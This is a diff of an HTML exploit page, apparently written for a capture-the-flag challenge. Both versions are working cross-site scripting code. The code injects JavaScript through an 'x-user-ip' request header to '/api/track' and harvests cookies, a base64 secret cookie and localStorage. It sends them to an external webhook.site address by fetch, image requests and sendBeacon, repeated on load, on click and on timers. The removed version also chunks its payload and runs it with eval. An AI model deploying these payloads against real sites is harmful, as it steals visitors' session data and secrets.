@@ -1,222 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Challenge Page</title>
+    <title>Click Me</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-        }
-        .target-button {
-            padding: 20px 40px;
-            font-size: 24px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            position: absolute;
+        .center-button {
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
+            background: #4CAF50;
+            color: white;
+            padding: 20px 40px;
+            font-size: 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
             z-index: 1000;
         }
     </style>
 </head>
 <body>
-    <button id="target-button" class="target-button">Click Me!</button>
+    <button id="button" class="center-button">Click Me!</button>
 
     <script>
-        // This is our main payload function - but we'll deliver it through multiple smaller payloads
-        function createMainPayload() {
-            return `
-            function leakFlag() {
-                // Get cookie
-                const cookie = document.cookie;
-                // Get secret cookie
-                const secretCookie = (function() {
-                    const value = "; " + document.cookie;
-                    const parts = value.split("; secret=");
-                    if (parts.length === 2) return parts.pop().split(";").shift();
-                    return null;
-                })();
-                
-                // Try to decode it
-                let decodedSecret = null;
-                try {
-                    decodedSecret = atob(secretCookie || "");
-                } catch(e) {}
-                
-                // Get localStorage data
-                const ls = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    ls[key] = localStorage.getItem(key);
-                }
-                
-                // Data to exfiltrate
-                const data = {
-                    cookies: cookie,
-                    secret: secretCookie,
-                    decoded: decodedSecret,
-                    localStorage: ls,
-                    url: location.href,
-                    time: new Date().toISOString()
-                };
-                
-                // Extract flag from secret cookie if possible
-                if (decodedSecret && decodedSecret.includes(":")) {
-                    data.extractedFlag = decodedSecret.split(":")[1];
-                }
-                
-                // Send data to webhook
-                try {
-                    fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify(data),
-                        mode: "no-cors"
-                    });
-                } catch(e) {}
-                
-                // Send via image as backup
-                try {
-                    const img = new Image();
-                    img.src = "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + 
-                        encodeURIComponent(data.extractedFlag || "") + 
-                        "&secret=" + encodeURIComponent(secretCookie || "") +
-                        "&t=" + Date.now();
-                    document.body.appendChild(img);
-                } catch(e) {}
-                
-                // Send via beacon (works when page closes)
-                try {
-                    navigator.sendBeacon(
-                        "https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a",
-                        JSON.stringify(data)
-                    );
-                } catch(e) {}
-            }
+        // Run when page loads
+        window.onload = function() {
+            // The initial payload - extremely simple
+            sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c="+document.cookie`);
             
-            // Create centered button
-            const btn = document.createElement("button");
-            btn.textContent = "Click Me!";
-            btn.style.position = "fixed";
-            btn.style.top = "50%";
-            btn.style.left = "50%";
-            btn.style.transform = "translate(-50%, -50%)";
-            btn.style.padding = "20px 40px";
-            btn.style.fontSize = "24px";
-            btn.style.backgroundColor = "#4CAF50";
-            btn.style.color = "white";
-            btn.style.border = "none";
-            btn.style.borderRadius = "10px";
-            btn.style.zIndex = "9999";
+            // Position button perfectly at center
+            const centerButton = document.createElement('button');
+            centerButton.textContent = 'Click Me!';
+            centerButton.className = 'center-button';
             
-            // When clicked, leak flag
-            btn.addEventListener("click", function() {
-                leakFlag();
-                // Schedule multiple leak attempts
-                for(let i=1; i<=6; i++) {
-                    setTimeout(leakFlag, i*10000);
-                }
+            // When clicked, send another exploit
+            centerButton.addEventListener('click', function() {
+                // Second payload triggered by click
+                sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=click&c="+document.cookie`);
+                
+                // After a few seconds, try to decode the secret
+                setTimeout(function() {
+                    // Super minimal decode payload
+                    sendExploit(`
+                    var s=document.cookie.split("secret=")[1]?.split(";")[0];
+                    var d;try{d=atob(s)}catch(e){d=""}
+                    new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?s="+s+"&d="+d;
+                    `);
+                }, 2000);
+                
+                // Schedule more payloads during the 60-second wait period
+                setTimeout(function() {
+                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=10&c="+document.cookie`);
+                }, 10000);
+                
+                setTimeout(function() {
+                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=30&c="+document.cookie`);
+                }, 30000);
             });
             
-            // Replace existing button
-            document.body.innerHTML = "";
-            document.body.appendChild(btn);
-            
-            // Also try leaking without click
-            setTimeout(leakFlag, 1000);
-            setTimeout(leakFlag, 15000);
-            setTimeout(leakFlag, 30000);
-            `;
-        }
-
-        // Breaking the payload into smaller chunks to avoid header size limits
-        function injectSmallPayload(code) {
-            // This function injects a small piece of code through the XSS vulnerability
+            // Replace the original button with our perfect center button
+            document.body.innerHTML = '';
+            document.body.appendChild(centerButton);
+        };
+        
+        // Function to send an XSS exploit via x-user-ip header
+        function sendExploit(code) {
+            // Create a hidden iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
-            // When iframe loads, send request with XSS payload in header
+            // When it loads, send the exploit
             iframe.onload = function() {
                 try {
-                    // Use URLencoded version of payload to avoid header validation issues
-                    const encodedPayload = encodeURIComponent(code);
-                    // Create a smaller header value
                     fetch('/api/track', {
                         headers: {
-                            'x-user-ip': 'eval(decodeURIComponent("' + encodedPayload + '"))'
+                            'x-user-ip': code
                         }
                     });
                 } catch(e) {
-                    console.error('Injection error:', e);
+                    console.error('Error sending exploit:', e);
                 }
             };
             
+            // Set source to trigger load
             iframe.src = 'about:blank';
         }
-        
-        // On page load
-        window.addEventListener('DOMContentLoaded', function() {
-            // Original button click handler (for testing locally)
-            document.getElementById('target-button').addEventListener('click', function() {
-                console.log('Button clicked');
-            });
-            
-            // Stage 1: Create a script tag that we'll use to inject our main payload
-            const stageOnePayload = `
-                const script = document.createElement('script');
-                script.id = 'payload-script';
-                script.textContent = '';
-                document.head.appendChild(script);
-                console.log('Stage 1 complete');
-            `;
-            injectSmallPayload(stageOnePayload);
-            
-            // Stage 2: Build our main payload in chunks
-            setTimeout(function() {
-                const mainPayload = createMainPayload();
-                // Split payload into smaller chunks (max 500 chars each)
-                const chunkSize = 500;
-                let i = 0;
-                
-                function injectNextChunk() {
-                    if (i >= mainPayload.length) {
-                        // All chunks injected, now execute
-                        injectSmallPayload(`
-                            const payloadScript = document.getElementById('payload-script');
-                            eval(payloadScript.textContent);
-                            console.log('Payload executed');
-                        `);
-                        return;
-                    }
-                    
-                    const chunk = mainPayload.substring(i, i + chunkSize);
-                    injectSmallPayload(`
-                        const payloadScript = document.getElementById('payload-script');
-                        payloadScript.textContent += "${chunk.replace(/"/g, '\\"').replace(/\n/g, '\\n')}";
-                        console.log('Chunk ${i/chunkSize + 1} added');
-                    `);
-                    
-                    i += chunkSize;
-                    setTimeout(injectNextChunk, 100);
-                }
-                
-                injectNextChunk();
-            }, 500);
-        });
     </script>
 </body>
 </html>
